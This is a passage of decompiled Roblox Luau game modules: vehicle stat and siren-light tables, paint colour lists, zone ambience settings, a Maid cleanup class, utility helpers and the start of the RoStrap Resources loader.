	BrakeAcceIeration = 15, 
	Steering = v9
};
v1.ElDorado4x4 = {
	Name = "ElDorado 4x4", 
	Asset = "ElDorado4x4", 
	MaxHealth = 850, 
	GasTank = 1000, 
	InventorySize = 160, 
	Paintable = true, 
	AcceIeration = 7.25, 
	Torque = 155000, 
	Gears = v1.ElDorado.Gears, 
	Drive = "AWD", 
	Weight = 540, 
	Suspension = v1.ElDorado.Suspension, 
	BrakeAcceIeration = 15, 
	Steering = v9
};
v1.PPDElDorado = {
	Name = "PPD ElDorado", 
	Asset = "PPDElDorado", 
	MaxHealth = 950, 
	GasTank = 1000, 
	InventorySize = 130, 
	Sirens = true, 
	Inventory = { { "Cone", 5 }, { "Jerrycan", 1 }, { "RadarGun", 1 } }, 
	AcceIeration = 7.5, 
	Torque = 160000, 
	Gears = { -15, 0, 30, 50, 70, 80, 95 }, 
	Drive = "AWD", 
	Weight = 550, 
	Suspension = v1.ElDorado.Suspension, 
	BrakeAcceIeration = 15, 
	Steering = v9, 
	LightPatterns = { { v11 } }
};
v1.PPDElDoradoSup = v2(v1.PPDElDorado, {
	Name = "PPD ElDorado S", 
	Asset = "PPDElDoradoSup"
});
v1.FireElDorado = v2(v1.PPDElDorado, {
	Name = "Fire ElDorado", 
	Asset = "FireElDorado", 
	Directors = true, 
	Inventory = { { "Cone", 5 }, { "Jerrycan", 1 } }, 
	LightPatterns = { { v21 }, v14 }
});
v1.Hankmobile = {
	Name = "Hankmobile", 
	Asset = "Hankmobile", 
	MaxHealth = 2000, 
	GasTank = 2500, 
	InventorySize = 200, 
	Paintable = true, 
	Color = BrickColor.new("Black"), 
	AcceIeration = 15, 
	Torque = 200000, 
	Gears = { -15, 0, 30, 50, 80, 120, 150 }, 
	Drive = "AWD", 
	Weight = 600, 
	Suspension = {
		Lower = 0.6, 
		Upper = 1.4, 
		Damping = 9000, 
		FreeLength = 1, 
		MaxForce = 400000, 
		Stiffness = 90000
	}, 
	BrakeAcceIeration = 30, 
	Steering = v9
};
v1.NGElDorado4x4 = {
	Name = "NG ElDorado 4x4", 
	Asset = "NGElDorado4x4", 
	MaxHealth = 950, 
	GasTank = 1000, 
	InventorySize = 160, 
	Inventory = { { "Cone", 8 }, { "NGBarrier", 2 }, { "Jerrycan", 1 } }, 
	AcceIeration = 7.5, 
	Torque = 160000, 
	Gears = { -15, 0, 30, 50, 70, 80, 95 }, 
	Drive = "AWD", 
	Weight = 540, 
	Suspension = v1.ElDorado.Suspension, 
	BrakeAcceIeration = 15, 
	Steering = v9
};
v1.AFIElDorado4x4 = {
	Name = "AFI ElDorado 4x4", 
	Asset = "AFIElDorado4x4", 
	MaxHealth = 950, 
	GasTank = 1000, 
	InventorySize = 160, 
	Inventory = {}, 
	AcceIeration = 7.5, 
	Torque = 160000, 
	Gears = { -15, 0, 30, 50, 70, 80, 95 }, 
	Drive = "AWD", 
	Weight = 540, 
	Suspension = v1.ElDorado.Suspension, 
	BrakeAcceIeration = 15, 
	Steering = v9
};
v1.FireAmbulance = {
	Name = "Fire Vanbulance", 
	Asset = "FireAmbulance", 
	MaxHealth = 1000, 
	GasTank = 1300, 
	InventorySize = 200, 
	Sirens = true, 
	Inventory = { { "FireBarrier", 3 }, { "Cone", 5 }, { "Jerrycan", 1 } }, 
	AcceIeration = 7, 
	Torque = 180000, 
	Gears = { -15, 0, 30, 50, 70, 80, 90 }, 
	Drive = "RWD", 
	Weight = 650, 
	Suspension = {
		Lower = 0.2, 
		Upper = 1.2, 
		Damping = 10000, 
		FreeLength = 0.7, 
		MaxForce = 400000, 
		Stiffness = 95000
	}, 
	BrakeAcceIeration = 12, 
	Steering = v9, 
	LightPatterns = { { v21 } }
};
v1.FireBoxAmbulance = {
	Name = "Fire Ambulance", 
	Asset = "FireBoxAmbulance", 
	MaxHealth = 1100, 
	GasTank = 1350, 
	InventorySize = 220, 
	Sirens = true, 
	Inventory = { { "FireBarrier", 3 }, { "Cone", 5 }, { "Jerrycan", 1 } }, 
	AcceIeration = 6.5, 
	Torque = 190000, 
	Gears = { -15, 0, 30, 50, 70, 80, 90 }, 
	Drive = "RWD", 
	Weight = 750, 
	Suspension = {
		Lower = 0.3, 
		Upper = 1.3, 
		Damping = 10000, 
		FreeLength = 0.8, 
		MaxForce = 400000, 
		Stiffness = 115000
	}, 
	BrakeAcceIeration = 11, 
	Steering = v9, 
	LightPatterns = { { { { "WE", "WE2", "OE", "RE", "RE2" }, { { { { "RE", "WE", "OE" }, { "WE2", "RE2" }, 0.3 }, { { "WE2", "RE2" }, { "RE", "WE", "OE" }, 0.3 }, { { "RE", "WE" }, { "WE2", "RE2", "OE" }, 0.3 }, { { "WE2", "RE2", "OE" }, { "RE", "WE" }, 0.3 } } } } } }
};
v1.FireTruck = {
	Name = "Fire Truck", 
	Asset = "FireTruck", 
	MaxHealth = 1000, 
	GasTank = 2200, 
	InventorySize = 300, 
	Sirens = true, 
	Inventory = { { "FireBarrier", 10 }, { "Cone", 5 }, { "Jerrycan", 1 } }, 
	AcceIeration = 6.25, 
	Torque = 240000, 
	Gears = { -15, 0, 30, 50, 70, 80, 90 }, 
	Drive = "AWD", 
	Weight = 1200, 
	Suspension = {
		Lower = 0.4, 
		Upper = 2.2, 
		Damping = 20000, 
		FreeLength = 1.2, 
		MaxForce = 400000, 
		Stiffness = 200000
	}, 
	BrakeAcceIeration = 10, 
	Steering = v9, 
	LightPatterns = { { { { "RE", "RE2" }, { { { { "RE" }, { "RE2" }, 0.3 }, { { "RE2" }, { "RE" }, 0.3 } } } } } }
};
v1.StretchCrusader = {
	Name = "Stretch Crusader", 
	Asset = "StretchCrusader", 
	MaxHealth = 1000, 
	GasTank = 600, 
	InventorySize = 90, 
	Paintable = true, 
	AcceIeration = 6.25, 
	Torque = 110000, 
	Gears = { -15, 0, 30, 50, 70, 80, 90 }, 
	Drive = "RWD", 
	Weight = 450, 
	Suspension = {
		Lower = 0.7, 
		Upper = 1.4, 
		Damping = 7000, 
		FreeLength = 1.1, 
		MaxForce = 400000, 
		Stiffness = 70000
	}, 
	BrakeAcceIeration = 16, 
	Steering = v9
};
v1.Crusader = {
	Name = "Crusader", 
	Asset = "Crusader", 
	MaxHealth = 900, 
	GasTank = 500, 
	InventorySize = 70, 
	Paintable = true, 
	AcceIeration = 9.5, 
	Torque = 95000, 
	Gears = { -15, 0, 30, 50, 70, 90, 110 }, 
	Drive = "RWD", 
	Weight = 400, 
	Suspension = {
		Lower = 0.7, 
		Upper = 1.3, 
		Damping = 6000, 
		FreeLength = 1.1, 
		MaxForce = 400000, 
		Stiffness = 60000
	}, 
	BrakeAcceIeration = 18, 
	Steering = v9
};
v1.CabCrusader = v2(v1.Crusader, {
	Name = "Crusader Taxi", 
	Asset = "CabCrusader", 
	--	Color = BrickColor.new("Gold"),
	Paintable = true, 
});
v1.SheriffCrusader = {
	Name = "Sheriff Crusader", 
	Asset = "SheriffCrusader", 
	MaxHealth = 1000, 
	GasTank = 500, 
	InventorySize = 80, 
	Sirens = true, 
	Inventory = { { "Cone", 5 }, { "Jerrycan", 1 }, { "RadarGun", 1 } }, 
	AcceIeration = 10, 
	Torque = 100000, 
	Gears = { -15, 0, 30, 50, 70, 90, 120 }, 
	Drive = "RWD", 
	Weight = 400, 
	Suspension = v1.Crusader.Suspension, 
	BrakeAcceIeration = 20, 
	Steering = v9, 
	Directors = true, 
	LightPatterns = v15
};
v1.LPDCrusader = v2(v1.SheriffCrusader, {
	Name = "LPD Crusader", 
	Asset = "LPDCrusader", 
	LightPatterns = { { { { "WE", "RE" }, { { { { "WE" }, { "RE" }, 0.3 }, { { "RE" }, { "WE" }, 0.3 } } } } }, v13 }
});

v1.SheriffCrusaderS = v2(v1.SheriffCrusader, {
	Name = "Sheriff Crusader S", 
	Asset = "SheriffCrusaderS", 
	LightPatterns = v15
});
v1.BRITCrusader = v2(v1.SheriffCrusader, {
	Name = "British Crusader", 
	Asset = "BRITCrusader", 
});
v1.CHPCrusader = v2(v1.SheriffCrusader, {
	Name = "CHP Crusader", 
	Asset = "CHPCrusader", 
});
v1.RCSOCrusaderV1 = v2(v1.SheriffCrusader, {
	Name = "RCSO Crusader v1", 
	Asset = "RCSOCrusaderV1", 
	Inventory = {}, 
});
v1.RCSOCrusaderV2 = v2(v1.SheriffCrusader, {
	Name = "RCSO Crusader v2", 
	Asset = "RCSOCrusaderV2", 
	Inventory = {}, 
});
v1.TPOCrusader = v2(v1.SheriffCrusader, {
	Name = "TPO Crusader", 
	Asset = "TPOCrusader", 
	Inventory = {}, 
});
v1.LPDCrusaderS = v2(v1.SheriffCrusader, {
	Name = "LPD Crusader S", 
	Asset = "LPDCrusaderS", 
	LightPatterns = swag
});
v1.McDoogleCrusader = v2(v1.SheriffCrusader, {
	Name = "McDoogle Crusader", 
	Asset = "McDoogleCrusader", 
	LightPatterns = { { { { "WE", "OE" }, { { { { "WE" }, { "OE" }, 0.3 }, { { "OE" }, { "WE" }, 0.3 } } } } }, v13 },
	Inventory = {}, 
	Directors = true
});
v1.ASPSCrusaderC = v2(v1.McDoogleCrusader, {
	Name = "ASPS Crusader C", 
	Suspension = {
		Lower = 0.7, 
		Upper = 1.5, 
		Damping = 7000, 
		FreeLength = 1.1, 
		MaxForce = 400000, 
		Stiffness = 70000
	},
	AcceIeration = 8,
	Inventory = {}, 
	Directors = true,
	Asset = "ASPSCrusaderC", 
	LightPatterns = { { v25 }, v13 }, 
});
v1.PPDCrusader = v2(v1.SheriffCrusader, {
	Name = "PPD Crusader", 
	Asset = "PPDCrusader"
});
v1.PPDCrusaderS = v2(v1.SheriffCrusader, {
	Name = "PPD Crusader S", 
	Asset = "PPDCrusaderS"
});
v1.MSPCrusader = v2(v1.SheriffCrusader, {
	Name = "DSP Crusader", 
	Asset = "MSPCrusader"
});
v1.MSPCrusaderS = v2(v1.SheriffCrusader, {
	Name = "DSP Crusader S", 
	Asset = "MSPCrusaderS"
});
v1.UnmarkedCrusader = v2(v1.SheriffCrusader, {
	Name = "Unmarked Crusader", 
	Asset = "UnmarkedCrusader", 
	Inventory = { { "Cone", 5 }, { "Jerrycan", 1 } }, 
	Color = BrickColor.new("Black"), 
	Paintable = true, 
	LightPatterns = v16
});
v1.NGCrusader = v2(v1.SheriffCrusader, {
	Name = "NG Crusader", 
	Asset = "NGCrusader", 
	_Sirens = true, 
	_LightPatterns = true, 
	_Directors = true, 
	Inventory = { { "Cone", 5 }, { "Jerrycan", 1 } }
});
v1.NGCrusaderMP = v2(v1.NGCrusader, {
	Name = "NG Crusader MP", 
	Asset = "NGCrusaderMP", 
	Sirens = true, 
	LightPatterns = { { v10 } }
});
v1.Carpathian = {
	Name = "Carpathian", 
	Asset = "Carpathian", 
	MaxHealth = 500, 
	GasTank = 300, 
	InventorySize = 60, 
	AcceIeration = 4.5, 
	Torque = 90000, 
	Gears = { -6, 0, 10, 30, 50 }, 
	Drive = "RWD", 
	Weight = 400, 
	Suspension = {
		Lower = 0.6, 
		Upper = 1.2, 
		Damping = 6000, 
		FreeLength = 1, 
		MaxForce = 400000, 
		Stiffness = 60000
	}, 
	BrakeAcceIeration = 10, 
	Steering = v9
};
v1.CrusaderC = {
	Name = "Crusader Classic", 
	Asset = "CrusaderC", 
	MaxHealth = 825, 
	GasTank = 500, 
	InventorySize = 80, 
	Paintable = true, 
	AcceIeration = 8, 
	Torque = 110000, 
	Gears = { -15, 0, 30, 50, 70, 90, 100 }, 
	Drive = "RWD", 
	Weight = 450, 
	Suspension = {
		Lower = 0.7, 
		Upper = 1.5, 
		Damping = 7000, 
		FreeLength = 1.1, 
		MaxForce = 400000, 
		Stiffness = 70000
	}, 
	BrakeAcceIeration = 13, 
	Steering = v9
};
v1.CabCrusaderC = v2(v1.CrusaderC, {
	Name = "Crusader Taxi Classic", 
	Asset = "CabCrusaderC",
	Paintable = true, 
	--Color = BrickColor.new("Gold")
});
v1.SheriffCrusaderC = {
	Name = "Sheriff Crusader Classic", 
	Asset = "SheriffCrusaderC", 
	MaxHealth = 900, 
	GasTank = 500, 
	InventorySize = 90, 
	Sirens = true, 
	Inventory = { { "Cone", 5 }, { "Jerrycan", 1 }, { "RadarGun", 1 } }, 
	AcceIeration = 8.5, 
	Torque = 115000, 
	Gears = { -15, 0, 30, 50, 70, 90, 110 }, 
	Drive = "RWD", 
	Weight = 450, 
	Suspension = v1.CrusaderC.Suspension, 
	BrakeAcceIeration = 14, 
	Steering = v9, 
	LightPatterns = { { v11 } }
};
v1.SheriffCrusaderCS = v2(v1.SheriffCrusaderC, {
	Name = "Sheriff Crusader Classic S", 
	Asset = "SheriffCrusaderCS"
});
v1.LPDCrusaderC = v2(v1.SheriffCrusaderC, {
	Name = "LPD Crusader Classic", 
	Asset = "LPDCrusaderC", 
	LightPatterns = { { v19 } }
});
v1.LPDCrusaderCS = v2(v1.SheriffCrusaderC, {
	Name = "LPD Crusader Classic S", 
	Asset = "LPDCrusaderCS", 
	LightPatterns = { { v19 } }
});
v1.PPDCrusaderC = v2(v1.SheriffCrusaderC, {
	Name = "PPD Crusader Classic", 
	Asset = "PPDCrusaderC"
});
v1.PPDCrusaderCS = v2(v1.SheriffCrusaderC, {
	Name = "PPD Crusader Classic S", 
	Asset = "PPDCrusaderCS"
});
v1.MSPCrusaderC = v2(v1.SheriffCrusaderC, {
	Name = "DSP Crusader Classic", 
	Asset = "MSPCrusaderC"
});
v1.MSPCrusaderCS = v2(v1.SheriffCrusaderC, {
	Name = "DSP Crusader Classic S", 
	Asset = "MSPCrusaderCS"
});
v1.UnmarkedCrusaderC = v2(v1.SheriffCrusaderC, {
	Name = "Unmarked Crusader Classic", 
	Asset = "UnmarkedCrusaderC", 
	Color = BrickColor.new("Black"), 
	Paintable = true, 
	LightPatterns = { { { { "RE" }, { { { { "RE" }, {}, 0.3 }, { {}, { "RE" }, 0.3 } } } } } }
});
v1.NGCrusaderC = v2(v1.SheriffCrusaderC, {
	Name = "NG Crusader Classic", 
	Asset = "NGCrusaderC", 
	_Sirens = true, 
	_LightPatterns = true, 
	Inventory = { { "Cone", 5 }, { "Jerrycan", 1 } }
});
v1.ASPSCrusaderCS = v2(v1.SheriffCrusaderC, {
	Name = "ASPS Crusader CS", 
	Asset = "ASPSCrusaderCS", 
	_Sirens = true, 
	_LightPatterns = true, 
	Inventory = {}
});
v1.NGCrusaderCMP = v2(v1.NGCrusaderC, {
	Name = "NG Crusader Classic MP", 
	Asset = "NGCrusaderCMP", 
	Sirens = true, 
	LightPatterns = { { v10 } }
});
v1.SheriffCrusaderCS = v2(v1.SheriffCrusaderC, {
	Name = "Sheriff Crusader Classic S", 
	Asset = "SheriffCrusaderCS"
});
v1.GolfCart = {
	Name = "Little Tee", 
	Asset = "GolfCart", 
	MaxHealth = 400, 
	GasTank = 300, 
	InventorySize = 20, 
	Paintable = true, 
	Electric = true, 
	AcceIeration = 10, 
	Torque = 9000, 
	Gears = { -15, 0, 20 }, 
	Drive = "RWD", 
	Weight = 100, 
	Suspension = {
		Lower = 0.5, 
		Upper = 1.1, 
		Damping = 3000, 
		FreeLength = 0.8, 
		MaxForce = 10000, 
		Stiffness = 20000
	}, 
	BrakeAcceIeration = 11, 
	Steering = v9
};
v1.McDoogleCart = v2(v1.GolfCart, {
	Name = "McDoogle Tee", 
	Asset = "McDoogleCart", 
	_Paintable = true, 
	LightPatterns = { { v20 } }, 
	Sirens = true
});
v1.RacerCrusader = {
	Name = "RacerCrusader", 
	Asset = "RacerCrusader", 
	MaxHealth = 2000, 
	GasTank = 2500, 
	InventorySize = 200, 
	Paintable = true, 
	Color = BrickColor.new("Black"), 
	AcceIeration = 15, 
	Torque = 200000, 
	Gears = { -15, 0, 30, 50, 80, 120, 150 }, 
	Drive = "AWD", 
	Weight = 600, 
	Suspension = {
		Lower = 0.6, 
		Upper = 1.4, 
		Damping = 9000, 
		FreeLength = 1, 
		MaxForce = 400000, 
		Stiffness = 90000
	}, 
	BrakeAcceIeration = 30, 
	Steering = v9
};
return v1;

vehicles.dealershippaintcolors
-- Decompiled with the Synapse X Luau decompiler.

return { BrickColor.new("Pastel Blue"), BrickColor.new("Light reddish violet"), BrickColor.new("Mint"), };

vehicles.paintcolors
-- Decompiled with the Synapse X Luau decompiler.

return { BrickColor.new("Bright yellow"), BrickColor.new("Royal purple"), BrickColor.new("Persimmon"), BrickColor.new("Br. yellowish orange"), BrickColor.new("Pine Cone"), BrickColor.new("Shamrock"), BrickColor.new("Slime green"), BrickColor.new("Baby blue"), BrickColor.new("Tawny"), BrickColor.new("Reddish brown"), BrickColor.new("Mint"), BrickColor.new("White"), BrickColor.new("Maroon"), BrickColor.new("Bright bluish green"), BrickColor.new("Artichoke"), BrickColor.new("Sand red"), BrickColor.new("Steel blue"), BrickColor.new("Black"), BrickColor.new("Sunrise"), BrickColor.new("Plum"), BrickColor.new("Br. yellowish green"), BrickColor.new("Smokey grey"), BrickColor.new("Bright blue"), BrickColor.new("Electric blue"), BrickColor.new("Bright orange"), BrickColor.new("Sea green"), BrickColor.new("Gold"), BrickColor.new("Fossil"), BrickColor.new("Buttermilk"), BrickColor.new("Pastel orange"), BrickColor.new("Cocoa"), BrickColor.new("Cool yellow"), BrickColor.new("Alder"), BrickColor.new("Neon orange"), BrickColor.new("Lavender"), BrickColor.new("Grime"), BrickColor.new("Medium red"), BrickColor.new("Pink"), BrickColor.new("Hurricane grey") };

database.zones 
-- Decompiled with the Synapse X Luau decompiler.

return {
	Outside = {
		Outside = true, 
		Ambience = {
			Day = "rbxassetid://526738965", 
			Night = "rbxassetid://390457804"
		}, 
		AmbientReverb = Enum.ReverbType.City
	}, 
	Tunnel = {
		AmbientReverb = Enum.ReverbType.Cave, 
		RollOffScale = 0.4
	}, 
	StateHouse = {
		AmbientReverb = Enum.ReverbType.StoneRoom
	}, 
	Apartment = {
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	NHCTA = {
		Ambience = { "rbxassetid://1839896751" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	MPBS = {
		Ambience = { "rbxassetid://1836326360" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	ParkWild = {
		Ambience = { "rbxassetid://1837152501" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	McDoogle = {
		Ambience = { "rbxassetid://1842645112" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Mansion = {
		Ambience = { "rbxassetid://1837255411" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Volcano = {
		Ambience = { "rbxassetid://1836032761" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	MSPB = {
		Ambience = { "rbxassetid://1844372210" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	NGWP = {
		Ambience = { "rbxassetid://1837477829" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	ASPS = {
		Ambience = { "rbxassetid://5801523905" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	},
	Labratory = {
		Ambience = { "rbxassetid://1835124514" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Rooftop = {
		Ambience = { "rbxassetid://1843535692" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Asian = {
		Ambience = { "rbxassetid://1837708187" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Foxhound = {
		Ambience = { "rbxassetid://1842719368" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Trailer = {
		Ambience = { "rbxassetid://1838907824" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Aces = {
		Ambience = { "rbxassetid://1837261172" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Sheriff = {
		Ambience = { "rbxassetid://1846080689" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	LPD = {
		Ambience = { "rbxassetid://1836690768" }, 
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	FireTower = {
		Ambience = { "rbxassetid://1435208742" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Barbers = {
		Ambience = { "rbxassetid://1255838673" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	GunStore = {
		Ambience = { "rbxassetid://1845756489" }, 
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	Taphouse = {
		Ambience = { "rbxassetid://1435196603" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Store = {
		Ambience = { "rbxassetid://1841476212" }, 
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	Office = {
		Ambience = { "rbxassetid://216782254" }, 
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	PollingStation = {
		Ambience = { "rbxassetid://216782254" }, 
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	Shamrock = {
		Ambience = { "rbxassetid://1435190218" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Hospital = {
		Ambience = { "rbxassetid://1848347614" }, 
		AmbientReverb = Enum.ReverbType.Bathroom
	}, 
	WestEnterprise = {
		Ambience = { "rbxassetid://1836790668" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Warehouse = {
		AmbientReverb = Enum.ReverbType.Hangar
	}, 
	RussianClub = {
		Ambience = { "rbxassetid://1845924062" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	Church = {
		Ambience = { "rbxassetid://154294567" }, 
		AmbientReverb = Enum.ReverbType.Auditorium
	}, 
	Stadium = {
		Ambience = { "rbxassetid://1846417887" }, 
		AmbientReverb = Enum.ReverbType.Auditorium
	}, 
	Playground = {
		Ambience = { "rbxassetid://1840544541" }, 
		AmbientReverb = Enum.ReverbType.Auditorium
	}, 
	Beach = {
		Ambience = { "rbxassetid://1845891274" }, 
		AmbientReverb = Enum.ReverbType.Auditorium
	}, 
	Residential = {
		Ambience = { "rbxassetid://1836362602" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	FireStation = {
		Ambience = { "rbxassetid://1841007628" }, 
		AmbientReverb = Enum.ReverbType.StoneRoom
	}, 
	Lighthouse = {
		Ambience = { "rbxassetid://1839738369" }, 
		AmbientReverb = Enum.ReverbType.StoneRoom
	}, 
	DDStore = {
		Ambience = { "rbxassetid://1842368693" }, 
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	ED = {
		Ambience = { "rbxassetid://1836894438" }, 
		AmbientReverb = Enum.ReverbType.Cave
	}, 
	Sewer = {
		Ambience = { "rbxassetid://1839842545" }, 
		AmbientReverb = Enum.ReverbType.SewerPipe
	}, 
	Courthouse = {
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	Library = {
		Ambience = { "rbxassetid://1435178204" }, 
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	Farm = {
		Ambience = { "rbxassetid://1838998011" }, 
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	Bank = {
		Ambience = { "rbxassetid://1842306658" }, 
		AmbientReverb = Enum.ReverbType.ConcertHall
	}, 
	NationalGuard = {
		Ambience = { "rbxassetid://1841049702" }, 
		AmbientReverb = Enum.ReverbType.ConcertHall
	}, 
	Restaurant = {
		Ambience = { "rbxassetid://1435185514" }, 
		AmbientReverb = Enum.ReverbType.CarpettedHallway
	}, 
	Prison = {
		Ambience = { "rbxassetid://1839919050" }, 
		AmbientReverb = Enum.ReverbType.StoneCorridor
	}, 
	OldPrison = {
		Ambience = { "rbxassetid://1435168082" }, 
		AmbientReverb = Enum.ReverbType.StoneCorridor
	}, 
	IrishPub = {
		Ambience = { "rbxassetid://1435174406" }, 
		AmbientReverb = Enum.ReverbType.Hallway
	}, 
	VoltNightclub = {
		Ambience = { "rbxassetid://1844783569", "rbxassetid://1846605381", "rbxassetid://1845369400", "rbxassetid://1843256986", "rbxassetid://1837250151" }, 
		AmbientReverb = Enum.ReverbType.Arena
	}
};

replicatedstorage.shared.maid

-- Decompiled with the Synapse X Luau decompiler.
local u1 = nil
u1 = {
	ClassName = "Maid", 
	new = function()
		return setmetatable({
			_tasks = {}
		}, u1);
	end, 
	__index = function(p1, p2)
		if u1[p2] then
			return u1[p2];
		end;
		return p1._tasks[p2];
	end, 
	__newindex = function(p3, p4, p5)
		if u1[p4] ~= nil then
			error(("'%s' is reserved"):format(tostring(p4)), 2);
		end;
		local l___tasks__1 = p3._tasks;
		local v2 = l___tasks__1[p4];
		l___tasks__1[p4] = p5;
		if v2 then
			if type(v2) == "function" then
				v2();
				return;
			end;
			if typeof(v2) ~= "RBXScriptConnection" then
				if v2.Destroy then
					v2:Destroy();
				end;
				return;
			end;
		else
			return;
		end;
		v2:Disconnect();
	end, 
	GiveTask = function(p6, p7)
		assert(p7);
		local v3 = #p6._tasks + 1;
		p6[v3] = p7;
		if type(p7) == "table" and not p7.Destroy then
			warn("[Maid.GiveTask] - Gave table task without .Destroy\n\n" .. debug.traceback());
		end;
		return v3;
	end, 
	GivePromise = function(p8, p9)
		if not p9:IsPending() then
			return p9;
		end;
		local v4 = p9:resolved();
		local u2 = p8:GiveTask(v4);
		v4:Finally(function()
			p8[u2] = nil;
		end);
		return v4;
	end, 
	DoCleaning = function(p10)
		local l___tasks__5 = p10._tasks;
		for v6, v7 in pairs(l___tasks__5) do
			if typeof(v7) == "RBXScriptConnection" then
				l___tasks__5[v6] = nil;
				v7:Disconnect();
			end;
		end;
		local v8, v9 = next(l___tasks__5);
		while v9 ~= nil do
			l___tasks__5[v8] = nil;
			if type(v9) == "function" then
				v9();
			elseif typeof(v9) == "RBXScriptConnection" then
				v9:Disconnect();
			elseif v9.Destroy then
				v9:Destroy();
			end;
			local v10, v11 = next(l___tasks__5);
			v8 = v10;
			v9 = v11;		
		end;
	end
};
u1.Destroy = u1.DoCleaning;
return u1;

replicatedstorage.shared.util
--SynapseX Decompiler

local API = {}
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
function API.ShallowCopy(orig)
	local orig_type = type(orig)
	local copy
	if orig_type == "table" then
		copy = {}
		for orig_key, orig_value in pairs(orig) do
			copy[orig_key] = orig_value
		end
	else
		copy = orig
	end
	return copy
end
function API.DeepCopy(val)
	if type(val) == "table" then
		local new = {}
		for k, v in pairs(val) do
			new[k] = API.DeepCopy(v)
		end
		return new
	else
		return val
	end
end
function API.ExpPcall(initWait, maxTries, func)
	local try = 0
	local suc, val
	repeat
		suc, val = pcall(func)
		if not suc then
			wait(initWait)
			try = try + 1
			initWait = initWait * 2
		end
	until suc or maxTries <= try
	return suc and val, suc
end
function API.Find(tab, object)
	for i, v in pairs(tab) do
		if v == object then
			return i
		end
	end
end
function API.GetHumanoidRootPart(player)
	if player.Character then
		return player.Character:FindFirstChild("HumanoidRootPart")
	end
end
function API.GetHumanoid(character)
	return character:FindFirstChild("Humanoid")
end
function API.GetHumanoidFromPlayer(player)
	if player and player.Character then
		return API.GetHumanoid(player.Character)
	end
end
function API.GetUserIdFromUsername(username)
	for _, v in pairs(Players:GetPlayers()) do
		if v.Name:lower() == username:lower() then
			return v.UserId
		end
	end
	local suc, val = pcall(Players.GetUserIdFromNameAsync, Players, username)
	return suc and val
end
function API.GetUsernameFromUserId(userId)
	local player = Players:GetPlayerByUserId(userId)
	if player then
		return player.Name
	else
		local suc, val = pcall(Players.GetNameFromUserIdAsync, Players, userId)
		return suc and val
	end
end
function API.TrimString(s)
	return s:gsub("^%s*(.-)%s*$", "%1")
end
function API.GetDistanceBetweenPlayers(player1, player2)
	local hrt1 = API.GetHumanoidRootPart(player1)
	local hrt2 = API.GetHumanoidRootPart(player2)
	if hrt1 and hrt2 then
		return (hrt1.Position - hrt2.Position).Magnitude
	end
end
return API

      replicatedstorage.resources

-- The core resource manager and library loader for RoStrap
-- @rostrap Resources
-- It is designed to increase organization and streamline the retrieval and networking of resources.
-- @documentation https://rostrap.github.io/Resources/
-- @source https://github.com/RoStrap/Resources/
-- @author Validark

local RunService = game:GetService("RunService")

local Metatable = {}
local Resources = setmetatable({}, Metatable)
local Caches = {} -- All cached data within Resources is accessible through Resources:GetLocalTable()

local Instance_new, type, require = Instance.new, type, require
local LocalResourcesLocation

local SERVER_SIDE = RunService:IsServer()
local UNINSTANTIABLE_INSTANCES = setmetatable({
	Folder = false; RemoteEvent = false; BindableEvent = false;
	RemoteFunction = false; BindableFunction = false; Library = true;
}, {
	__index = function(self, InstanceType)
		local Instantiable, GeneratedInstance = pcall(Instance_new, InstanceType)
		local Uninstantiable

		if Instantiable and GeneratedInstance then
			GeneratedInstance:Destroy()
			Uninstantiable = false
		else
			Uninstantiable = true
		end

		self[InstanceType] = Uninstantiable
		return Uninstantiable
	end;
})

function Resources:GetLocalTable(TableName) -- Returns a cached table by TableName, generating if non-existant
	TableName = self ~= Resources and self or TableName
	local Table = Caches[TableName]

	if not Table then
		Table = {}
		Caches[TableName] = Table
	end

	return Table
end

local function GetFirstChild(Folder, InstanceName, InstanceType)
	local Object = Folder:FindFirstChild(InstanceName)

	if not Object then
		if UNINSTANTIABLE_INSTANCES[InstanceType] then error("[Resources] " .. InstanceType .. " \"" .. InstanceName .. "\" is not installed within " .. Folder:GetFullName() .. ".", 2) end
		Object = Instance_new(InstanceType)
		Object.Name = InstanceName
		Object.Parent = Folder
	end

	return Object
end

function Metatable:__index(MethodName)
	if type(MethodName) ~= "string" then error("[Resources] Attempt to index Resources with invalid key: string expected, got " .. typeof(MethodName), 2) end
	if MethodName:sub(1, 3) ~= "Get" then error("[Resources] Methods should begin with \"Get\"", 2) end
	local InstanceType = MethodName:sub(4)

	-- Set CacheName to ["RemoteEvent" .. "s"], or ["Librar" .. "ies"]
